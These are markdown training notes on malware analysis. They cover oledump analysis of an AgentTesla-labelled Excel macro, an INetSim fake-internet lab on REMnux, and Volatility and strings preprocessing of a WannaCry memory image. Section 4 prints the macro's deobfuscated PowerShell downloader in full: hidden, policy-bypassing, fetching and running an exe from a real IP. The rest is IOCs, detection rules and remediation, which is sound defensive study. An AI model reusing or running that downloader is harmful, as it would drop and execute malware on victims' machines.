# Oledump + VBA Macro Analysis 

> Goal: Make this easy to read and understand.  
> Put this file in your repo as `oledump-vba-agenttesla.md`.  
> Commands are shown as normal lines (no shell highlighting) so you can copy-paste into docs.



## 1) Short summary 
We opened an Excel file `agenttesla.xlsm` with `oledump.py` and found a VBA macro in the `VBA/ThisWorkbook` stream. The macro builds an obfuscated PowerShell command, downloads `Doc-3737122pdf.exe` from `http://193.203.203.67/rt/` to a temporary file, renames it to `.exe`, and runs it. The macro uses simple obfuscation characters (`*` and `^`) that the script removes before executing the PowerShell command.



## 2) Commands you ran 
oledump.py agenttesla.xlsm  
oledump.py agenttesla.xlsm -s 4  
oledump.py agenttesla.xlsm -s 4 --vbadecompress



## 3) What oledump showed 
- oledump lists data streams inside the Excel OLE container.
- Streams marked with `M` contain macros. In our file, `VBA/ThisWorkbook` had `M`, so we examined it.
- Using `--vbadecompress` converts compressed VBA into readable VBA text.



## 4) Key VBA excerpt we found (cleaned)
The macro built this string (after replacing `*` and `^` with nothing):

powershell -WindowStyle hidden -executionpolicy bypass; $TempFile = [IO.Path]::GetTempFileName() | Rename-Item -NewName { $_ -replace 'tmp$', 'exe' } PassThru; Invoke-WebRequest -Uri "http://193.203.203.67/rt/Doc-3737122pdf.exe" -OutFile $TempFile; Start-Process $TempFile;


## 5) What that PowerShell does (line-by-line, simple)
- `-WindowStyle hidden` — run PowerShell without showing a window (user won't see it).  
- `-executionpolicy bypass` — ignore PowerShell's execution restrictions so the script can run.  
- `$TempFile = [IO.Path]::GetTempFileName()` — make a temporary filename like `C:\Users\<user>\AppData\Local\Temp\abcd.tmp`.  
- `Rename-Item -NewName { $_ -replace 'tmp$', 'exe' }` — change the temp file extension from `.tmp` to `.exe`.  
- `Invoke-WebRequest -Uri "<URL>" -OutFile $TempFile` — download the file from the internet and save it to the temp path.  
- `Start-Process $TempFile` — execute the downloaded file (runs the .exe).



## 6) Why this is malicious (simple points)
- A macro runs automatically when the document is opened (common malware delivery).  
- It downloads an executable from an IP address and runs it silently — typical loader behavior (drops/executes next-stage malware).  
- Execution policy bypass and hidden window are red flags: attacker wants stealth and to avoid restrictions.



## 7) Quick IOCs (Indicators of Compromise)
- File name: `agenttesla.xlsm` (sample)  
- Download URL / IP: `http://193.203.203.67/rt/Doc-3737122pdf.exe`  
- Downloaded filename: `Doc-3737122pdf.exe` (saved to temp and executed)  
- VBA macro stream: `VBA/ThisWorkbook` (contains Sqtnew string)  
- Obfuscation markers used: `*` and `^` removed by Replace calls


## 8) How we deobfuscated (CyberChef steps explained)
1. Copy the macro string into CyberChef input.  
2. Use Find/Replace operation with:
   - Find: `*`  Replace with: (leave empty)  Mode: SIMPLE STRING  
3. Use another Find/Replace operation with:
   - Find: `^`  Replace with: (leave empty)  Mode: SIMPLE STRING  
4. Result: readable PowerShell command.

This mirrors the VBA lines:
Sqtnew = Replace(Sqtnew, "*", "")  
Sqtnew = Replace(Sqtnew, "^", "")



## 9) Detection ideas (what to look for in logs)
- SIEM / EDR rules to detect:
  - Office files with macros opened from email or web downloads.  
  - PowerShell invoked with `-ExecutionPolicy Bypass` and `-WindowStyle Hidden`.  
  - Processes that download from `193.203.203.67` or `*/rt/Doc-*.exe`.  
  - New `.exe` created in temp folder and immediately executed.  
  - Creation of temporary files renamed to `.exe` (pattern: tmp -> exe).  
- Sysmon / Windows Event IDs:
  - Process Create (Sysmon Event ID 1) — watch for `powershell.exe` with suspicious command line.  
  - File creation events — new executable in temp directories.  
  - Network connect events to external IPs from user endpoints (Sysmon Event ID 3).



## 10) Immediate remediation steps (quick)
- Isolate any host that opened `agenttesla.xlsm`.  
- Block `193.203.203.67` or the specific URL at proxy/firewall.  
- Scan endpoint for `Doc-3737122pdf.exe` and other suspicious files in temp.  
- If file executed, collect EDR telemetry, memory snapshot, and process tree.  
- Disable macros by default and enable macro security policies (group policy).  
- Add detection rules in SIEM for the PowerShell pattern above.



## 11) Prevention & hardening (recommendations)
- Office macro policy: Block macros from the Internet; only allow signed macros.  
- Implement application allowlisting for executables in Temp folders.  
- Enforce PowerShell logging (Module Logging, Script Block Logging) and forward logs to SIEM.  
- Use URL filtering or DNS allowlists to prevent downloads from suspicious domains/IPs.  
- User training: warn about enabling macros and suspicious attachments.



## 12) Short comparison table (easy)

| Stage observed | What it looks like | Why important |
|----------------|--------------------|---------------|
| Macro present | `VBA/ThisWorkbook` stream has `M` flag | Macros can run code on open |
| Obfuscated command | `*` and `^` removed by Replace | Simple obfuscation to evade quick detection |
| Downloader | `Invoke-WebRequest` to IP | Retrieves payload from attacker server |
| Execution | `Start-Process` on temp exe | Runs the downloaded malware |



## 13) Notes for further analysis (next steps)
- Extract the downloaded `.exe` (if available) and run static and dynamic analysis in sandbox (REMnux/INetSim).  
- Check the macro for persistence logic or other payloads (look for scheduled task creation, registry changes, WMI, etc.).  
- Search telemetry across the environment for other hosts contacting `193.203.203.67` or running similarly obfuscated PowerShell.



## 14) Short checklist you can copy to incident ticket
- [ ] Host isolated.  
- [ ] URL/IP blocked at edge.  
- [ ] List processes and files created from the incident.  
- [ ] EDR: collect memory/process dumps.  
- [ ] SIEM rule: detect PowerShell with `-ExecutionPolicy Bypass` + `Invoke-WebRequest`.  
- [ ] Update macro policy for Office via GPO.  
- [ ] Run full scan and forensic analysis on the host.

---
# INetSim (Dynamic Malware Analysis) 

> Goal: Observe malware-like behavior (network activity) in a safe, simulated environment.  
> Tool: **INetSim** inside **REMnux VM**.  
> We use two VMs: **REMnux (simulator)** + **AttackBox (attacker/client)**.



## 1) What is INetSim?
- Full form: **Internet Services Simulation Suite**.  
- Purpose: Creates a **fake internet** inside your lab.  
- Why? Malware often tries to **connect to servers** and **download payloads**. INetSim tricks malware into thinking it reached the internet, but actually logs all behavior safely.

Think of INetSim like:
| Real Internet | INetSim Fake Internet |
|---------------|------------------------|
| Malware talks to real attacker server | Malware talks to your fake server |
| Real payloads come in | Fake harmless payloads |
| Dangerous | Safe, controlled |



## 2) Setup steps (on REMnux VM)

### Step 1: Check IP
Run:
ifconfig  
(or look at terminal prompt → `ubuntu@MACHINE_IP`)

Take note of `MACHINE_IP`.



### Step 2: Edit INetSim config
Open config file:
sudo nano /etc/inetsim/inetsim.conf  

Find this line:
#dns_default_ip  0.0.0.0  

Do this:
- Remove `#` (uncomment it)  
- Replace `0.0.0.0` with your `MACHINE_IP`  

Example:
dns_default_ip   10.201.100.244  

Save with **CTRL+O**, press Enter, then exit with **CTRL+X**.



### Step 3: Confirm config
cat /etc/inetsim/inetsim.conf | grep dns_default_ip  

Expected output:
dns_default_ip   MACHINE_IP  


### Step 4: Start INetSim
sudo inetsim  

Look for:
Simulation running.  

Ignore `http_80_tcp - failed!` → that’s normal.



## 3) Test on AttackBox
Now switch to **AttackBox VM**.  
Try accessing REMnux server in browser:
https://MACHINE_IP  

- You’ll get a **security warning** (self-signed cert).  
- Click **Advanced → Accept Risk & Continue**.  
- You’ll land on **INetSim homepage** (proof it’s working).



## 4) Simulating malware download
One common malware behavior: **download 2nd payload**.

Run from AttackBox CLI:
sudo wget https://MACHINE_IP/second_payload.zip --no-check-certificate  

You’ll see:
second_payload.zip saved  

Do another test:
sudo wget https://MACHINE_IP/second_payload.ps1 --no-check-certificate  

Check files downloaded in current folder:
ls  

You should see:  
- second_payload.zip  
- second_payload.ps1  

Note: These are **fake files** provided by INetSim. If you open `.ps1`, it just redirects to INetSim homepage.



## 5) Why this is useful
We **mimicked real malware activity**:
1. Reaching out to internet server  
2. Downloading next payload  
3. Saving payload locally  

But all safely inside fake INetSim environment.

---

## 6) Stopping INetSim & checking logs
Stop simulation with:
CTRL+C (in the same terminal where it’s running)

INetSim saves a **report** in:
`/var/log/inetsim/report/`

Example report:
sudo cat /var/log/inetsim/report/report.2594.txt  

---

## 7) Sample log entries (explained)
```
2024-09-22 21:04:53 HTTPS connection, method: GET, URL: https://MACHINE_IP/, file name: /var/lib/inetsim/http/fakefiles/sample.html
2024-09-22 21:18:37 HTTPS connection, method: GET, URL: https://MACHINE_IP/second_payload.ps1, file name: /var/lib/inetsim/http/fakefiles/sample.html
2024-09-22 21:18:49 HTTPS connection, method: GET, URL: https://MACHINE_IP/second_payload.zip, file name: /var/lib/inetsim/http/fakefiles/sample.html
```
Meaning:
- **Method: GET** → type of HTTP request  
- **URL** → what client (malware) tried to access  
- **File name** → what INetSim served back (fake file)  


## 8) Quick comparison: Static vs Dynamic Analysis
| Static Analysis | Dynamic Analysis |
|-----------------|------------------|
| Look at file code (macros, strings) without running it | Run file in sandbox and watch its behavior |
| Example: `oledump.py` on Excel macro | Example: `INetSim` logs fake internet traffic |
| Pros: Safe, quick | Pros: Real behavior captured |
| Cons: May miss hidden logic | Cons: Needs controlled environment |


## 9) Real-world defender benefits
- **Hunting**: You now know what URLs/IPs malware would call (IOCs).  
- **Detection**: Create SIEM/IDS rules for suspicious downloads.  
- **Training**: Practice safely on fake payloads.  
- **Response**: Helps confirm if a file is *really malicious* by seeing what it *tries to do*.


## 10) Key takeaway
INetSim = Fake Internet.  
It tricks malware into showing its behavior (downloads, C2 comms) without letting it touch the real web.  
You can then analyze logs → extract IOCs → strengthen defenses.



---

# Preprocessing With Volatility & Strings (Easy Notes)

## 1) Why Preprocessing?
- In **Digital Forensics**, we don’t always analyze live in real-time.
- We often **run tools → save results → analyze later**.
- Output is usually saved in **text/JSON** for easier searching & reporting.
- Example: **Volatility** (memory forensics tool).

---

## 2) Memory Image in Use
File: `wcry.mem`  
Location: `/home/ubuntu/Desktop/tasks/Wcry_memory_image/`  

Switch to root:
```bash
sudo su
cd /home/ubuntu/Desktop/tasks/Wcry_memory_image/
```
## 3) Important Volatility Plugins (Windows Focus)

| Plugin | Purpose (Easy Words) | Example Use |
|--------|-----------------------|-------------|
| **windows.pstree.PsTree** | Show process hierarchy like a **family tree** | Who started `powershell.exe`? |
| **windows.pslist.PsList** | List all active processes | See if `explorer.exe` is running |
| **windows.cmdline.CmdLine** | Show command-line arguments of processes | Detect `cmd.exe /c whoami` |
| **windows.filescan.FileScan** | Find file objects in memory | Detect suspicious `.exe` or `.dll` |
| **windows.dlllist.DllList** | List DLLs loaded in processes | Find malware-injected DLLs |
| **windows.psscan.PsScan** | Scan memory for process objects (even hidden/terminated ones) | Uncover rootkits |
| **windows.malfind.Malfind** | Show suspicious memory injections | Detect shellcode |



## 4) Running Plugins Individually
Example:
vol3 -f wcry.mem windows.pstree.PsTree
vol3 -f wcry.mem windows.pslist.PsList
vol3 -f wcry.mem windows.cmdline.CmdLine
Each command takes ~2–3 minutes and shows results in terminal.



## 5) Automating with Loop (Bulk Preprocessing)
Instead of typing 7 commands one by one, use a **for loop**:

for plugin in windows.malfind.Malfind windows.psscan.PsScan windows.pstree.PsTree windows.pslist.PsList windows.cmdline.CmdLine windows.filescan.FileScan windows.dlllist.DllList; do
vol3 -q -f wcry.mem $plugin > wcry.$plugin.txt
done

### What happens here?
1. `for plugin in ...` → goes through each plugin name one by one.  
2. `vol3 -q` → runs volatility in quiet mode (no progress %).  
3. `-f wcry.mem $plugin` → tells which memory image & plugin to run.  
4. `> wcry.$plugin.txt` → saves output into a text file.  

### Example Output Files Created
- `wcry.windows.malfind.Malfind.txt`  
- `wcry.windows.psscan.PsScan.txt`  
- `wcry.windows.pstree.PsTree.txt`  
- `wcry.windows.pslist.PsList.txt`  
- `wcry.windows.cmdline.CmdLine.txt`  
- `wcry.windows.filescan.FileScan.txt`  
- `wcry.windows.dlllist.DllList.txt`

✅ Now we have **7 text files** → ready for fast searching (grep, filtering, etc.).



## 6) Preprocessing with Strings
Another important step = extract **human-readable text** from memory.  
Command used: **strings**

strings wcry.mem > wcry.strings.ascii.txt
strings -e l wcry.mem > wcry.strings.unicode_little_endian.txt
strings -e b wcry.mem > wcry.strings.unicode_big_endian.txt

### What these do:
- **ASCII strings** → normal text (filenames, registry keys, commands).  
- **Unicode Little Endian** → common in Windows programs.  
- **Unicode Big Endian** → sometimes used in configs or malware.  

### Output Files:
- `wcry.strings.ascii.txt`  
- `wcry.strings.unicode_little_endian.txt`  
- `wcry.strings.unicode_big_endian.txt`  



## 7) Why Do All This?
- **Volatility plugins** = structured forensic info (processes, DLLs, memory injections).  
- **Strings output** = raw text clues (URLs, IPs, ransom notes, configs).  
- Preprocessing saves time → analyst can directly **search, compare, and report** without running heavy commands again.



## 8) Big Picture Example
Imagine analyst finds this in strings output:
http://malicious-site[.]com/payment
And in PsList output:
ransomware.exe PID: 2345
Now analyst can **connect the dots** quickly → this process was malware contacting that site.



## 🔑 Key Takeaway
👉 Preprocessing = **extract once, analyze many times**.  
👉 Saves time, avoids rerunning tools, and makes evidence portable.  
👉 Next analyst can **search text files** instead of raw memory (faster, easier).

